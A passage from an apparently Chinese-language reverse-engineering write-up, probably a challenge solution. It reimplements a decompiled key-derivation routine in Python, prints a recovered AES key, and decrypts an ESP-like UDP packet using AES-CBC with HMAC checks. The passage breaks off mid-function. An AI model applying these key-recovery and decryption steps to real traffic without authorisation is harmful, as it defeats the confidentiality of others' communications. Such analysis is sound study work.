</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// al
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v2</span> <span class="o">=</span> <span class="o">*</span><span class="n">a1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">a2</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">a2</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">do</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="n">v3</span> <span class="o">+</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">a1</span><span class="p">[</span><span class="n">v4</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">3</span> <span class="o">*</span> <span class="n">v4</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="n">v3</span> <span class="o">+=</span> <span class="mi">17</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">a2</span> <span class="o">+</span> <span class="n">v4</span><span class="o">++</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="n">__ROL1__</span><span class="p">(</span><span class="n">v5</span> <span class="o">^</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">!=</span> <span class="mi">32</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span> <span class="n">i</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">__ROL1__</span><span class="p">((</span><span class="n">i</span> <span class="o">^</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">a1</span><span class="p">[((</span><span class="n">_BYTE</span><span class="p">)</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">i</span><span class="p">)))</span> <span class="o">-</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">a2</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">36</span><span class="p">)</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>里面函数很简单，同构下即可得到密钥为8df5a27a8256629f1558a9d2d856a63ca87bb9f9651560b6167b74d71f5b2022，同时根据分析可知iv是udp payload第八字节开始的16字节，密文是从iv后一直到最后12字节前</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">binascii</span><span class="o">,</span> <span class="nn">hmac</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha1</span><span class="p">,</span> <span class="n">sha256</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rol</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">bits</span><span class="o">=</span><span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Rotate-left x by n over `bits` bits. x assumed non-negative integer.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">mask</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">bits</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="n">n</span> <span class="o">%=</span> <span class="n">bits</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">((</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="n">n</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">bits</span> <span class="o">-</span> <span class="n">n</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="n">mask</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sub_404B00</span><span class="p">(</span><span class="n">a1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    a1: list/sequence, must have at least two integers (a1[0], a1[1]).
</span></span></span><span class="line"><span class="cl"><span class="s2">    返回 bytearray 模拟的 a2 内存块（长度 &gt;= 72 字节）。
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">a1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;a1 must contain at least two elements&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">a2_bytes</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>  <span class="c1"># 足够空间</span>
</span></span><span class="line"><span class="cl">    <span class="n">v2</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">a1</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># a2[17] = 1  (offset 17*4)</span>
</span></span><span class="line"><span class="cl">    <span class="n">struct</span><span class="o">.</span><span class="n">pack_into</span><span class="p">(</span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span> <span class="n">a2_bytes</span><span class="p">,</span> <span class="mi">17</span> <span class="o">*</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># *a2 = v2  (offset 0)</span>
</span></span><span class="line"><span class="cl">    <span class="n">struct</span><span class="o">.</span><span class="n">pack_into</span><span class="p">(</span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span> <span class="n">a2_bytes</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">v2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># --- 第一个循环 (填充 AES 密钥 @ a2[1]...a2[8]) ---</span>
</span></span><span class="line"><span class="cl">    <span class="n">v3</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">v4</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">key_val</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">a1</span><span class="p">[</span><span class="n">v4</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
</span></span><span class="line"><span class="cl">        <span class="n">shift</span> <span class="o">=</span> <span class="mi">3</span> <span class="o">*</span> <span class="n">v4</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># emulate x86 shift behaviour: shift count is masked to 5 bits (mod 32)</span>
</span></span><span class="line"><span class="cl">        <span class="n">shift_count</span> <span class="o">=</span> <span class="n">shift</span> <span class="o">&amp;</span> <span class="mh">0x1F</span>
</span></span><span class="line"><span class="cl">        <span class="n">shifted_val</span> <span class="o">=</span> <span class="p">(</span><span class="n">key_val</span> <span class="o">&gt;&gt;</span> <span class="n">shift_count</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">v5</span> <span class="o">=</span> <span class="p">(</span><span class="n">v3</span> <span class="o">+</span> <span class="n">shifted_val</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
</span></span><span class="line"><span class="cl">        <span class="n">v3</span> <span class="o">=</span> <span class="p">(</span><span class="n">v3</span> <span class="o">+</span> <span class="mi">17</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
</span></span><span class="line"><span class="cl">        <span class="n">val_to_rotate</span> <span class="o">=</span> <span class="p">(</span><span class="n">v5</span> <span class="o">^</span> <span class="mh">0x37</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">rol</span><span class="p">(</span><span class="n">val_to_rotate</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">a2_bytes</span><span class="p">[</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># --- 第二个循环 (填充 HMAC 密钥 @ a2[9]...a2[16]) ---</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">key_val</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">a1</span><span class="p">[(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
</span></span><span class="line"><span class="cl">        <span class="n">shift</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">        <span class="n">shift_count</span> <span class="o">=</span> <span class="n">shift</span> <span class="o">&amp;</span> <span class="mh">0x1F</span>
</span></span><span class="line"><span class="cl">        <span class="n">shifted_val</span> <span class="o">=</span> <span class="p">(</span><span class="n">key_val</span> <span class="o">&gt;&gt;</span> <span class="n">shift_count</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">val_32</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span> <span class="o">^</span> <span class="n">shifted_val</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
</span></span><span class="line"><span class="cl">        <span class="n">val_sub</span> <span class="o">=</span> <span class="p">(</span><span class="n">val_32</span> <span class="o">-</span> <span class="mi">85</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
</span></span><span class="line"><span class="cl">        <span class="n">val_to_rotate</span> <span class="o">=</span> <span class="n">val_sub</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">rol</span><span class="p">(</span><span class="n">val_to_rotate</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">a2_bytes</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">36</span><span class="p">]</span> <span class="o">=</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">a2_bytes</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_and_try</span><span class="p">(</span><span class="n">blob_hex</span><span class="p">,</span> <span class="n">a1_tuple</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">blob_hex</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">spi</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack_from</span><span class="p">(</span><span class="s2">&#34;&gt;I&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="mi">0</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">seq</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack_from</span><span class="p">(</span><span class="s2">&#34;&gt;I&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="mi">4</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">iv</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">24</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># assume ICV_len = 12 (from reverse)</span>
</span></span><span class="line"><span class="cl">    <span class="n">icv_len</span> <span class="o">=</span> <span class="mi">12</span>
</span></span><span class="line"><span class="cl">    <span class="n">icv</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="o">-</span><span class="n">icv_len</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl">    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">24</span><span class="p">:</span><span class="o">-</span><span class="n">icv_len</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;SPI&#34;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">spi</span><span class="p">),</span> <span class="s2">&#34;SEQ&#34;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">seq</span><span class="p">),</span> <span class="s2">&#34;IVlen&#34;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">iv</span><span class="p">),</span> <span class="s2">&#34;CT len&#34;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">key_blob</span> <span class="o">=</span> <span class="n">sub_404B00</span><span class="p">([</span><span class="nb">int</span><span class="p">(</span><span class="n">a1_tuple</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">a1_tuple</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">aes_key</span> <span class="o">=</span> <span class="n">key_blob</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">36</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">hmac_key</span> <span class="o">=</span> <span class="n">key_blob</span><span class="p">[</span><span class="mi">36</span><span class="p">:</span><span class="mi">68</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;AES key:&#34;</span><span class="p">,</span> <span class="n">aes_key</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;HMAC key:&#34;</span><span class="p">,</span> <span class="n">hmac_key</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># try hmac-sha1 and sha256 truncated 12</span>
</span></span><span class="line"><span class="cl">    <span class="n">mac1</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">hmac_key</span><span class="p">,</span> <span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="n">icv_len</span><span class="p">],</span> <span class="n">sha1</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()[:</span><span class="n">icv_len</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">mac2</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">hmac_key</span><span class="p">,</span> <span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="n">icv_len</span><span class="p">],</span> <span class="n">sha256</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()[:</span><span class="n">icv_len</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;packet ICV:&#34;</span><span class="p">,</span> <span class="n">icv</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;HMAC-SHA1(12):&#34;</span><span class="p">,</span> <span class="n">mac1</span><span class="o">.</span><span class="n">hex</span><span class="p">(),</span> <span class="s2">&#34;match?&#34;</span><span class="p">,</span> <span class="n">mac1</span><span class="o">==</span><span class="n">icv</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;HMAC-SHA256(12):&#34;</span><span class="p">,</span> <span class="n">mac2</span><span class="o">.</span><span class="n">hex</span><span class="p">(),</span> <span class="s2">&#34;match?&#34;</span><span class="p">,</span> <span class="n">mac2</span><span class="o">==</span><span class="n">icv</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ciphertext length not multiple of 16 -&gt; AES-CBC can&#39;t decrypt directly. Check IV/ICV lengths or mode.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">aes_key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pt</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># verify padding/padlen/next header etc here (ESP layout)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">pt</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">parse_and_try</span><span class="p">(</span><span class="s2">&#34;deadbeef0000000153f1c95b079add8b408a58d14e0b52e8ad888ee54da8ff38aba41196521336d34f485167227ddbc8752d492888d026a0e39bb901cc69e88e220d87c66369de77adb742bef9ba5f89e2563a34485a20c3ad93a31467b286de0d8eab51d06f225baad14f798f50e9aa751750b9a81fd2a709c9e52653a995f99f7d4aea0edddb9c213c5d87d18613a04015adcbfaf06e37d0ddf69287a568907907532abdeb9222e0379a3dce303e3bc70b988a0b4c29f7ec73451b5389bc989532f9953c5111b35a2442bd3b973c807e65b42b71c0dad710c2d653782aa29b6f2819c5c5a12171fd9e409e08044e79c8dd8b5ff7dfc1c93e81f820b92ecfdead9258b59363cc6723d684be7feb1e93cac141b237b892c8dcefd523fbf237d0e7c381d012e7541b60254aac733c9cb804cffa6e7749c55094124deeaf49271ed099f146c1270900798d533daee5fee55b3954f63742498fc5e3975f1071c560cf6a9dd8a7318ab057378a3e41bad076b4d0abb18c72b88551fd81be4042be257585801374&#34;</span><span class="p">,</span> <span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="mh">0xcafebabe</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">compute_xmmword_849860</span><span class="p">(</span><span class="n">a0</span><span class="p">,</span> <span class="n">a1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    Compute the 16-byte value produced by sub_404B70 for inputs a1[0]=a0, a1[1]=a1.
</span></span></span><span class="line"><span class="cl"><span class="s2">    Inputs: a0, a1 are integers representing 32-bit unsigned words.
</span></span></span><span class="line"><span class="cl"><span class="s2">    Returns: bytes object of length 16 (xmmword_849860).
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Normalize to 32-bit</span>
</span></span><span class="line"><span class="cl">    <span class="n">v7</span> <span class="o">=</span> <span class="n">a0</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
</span></span><span class="line"><span class="cl">    <span class="n">v8</span> <span class="o">=</span> <span class="n">a1</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">byte_of</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># bytes b0..b7 (lower qword)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b0</span> <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">((</span><span class="n">v7</span> <span class="o">^</span> <span class="n">v8</span><span class="p">))</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b1</span> <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">(((</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b2</span> <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">(((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b3</span> <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">(((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># BYTE1 is (v &gt;&gt; 8) &amp; 0xFF</span>
